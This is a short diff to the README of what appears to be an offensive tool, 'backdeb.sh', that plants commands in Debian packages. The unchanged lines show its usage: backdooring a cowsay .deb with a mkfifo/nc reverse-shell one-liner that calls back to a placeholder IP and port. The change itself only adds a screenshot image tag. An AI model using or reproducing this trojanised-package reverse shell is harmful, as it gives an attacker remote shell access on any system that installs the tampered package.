@@ -19,5 +19,9 @@ Get a reverse shell:
 ```
 ./backdeb.sh cowsay_3.03+dfsg2-8_all.deb "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f"
 ```
+
+<img src="screenshot.png">
+
+
 # Requisites
 <li>dpkg-deb</li>
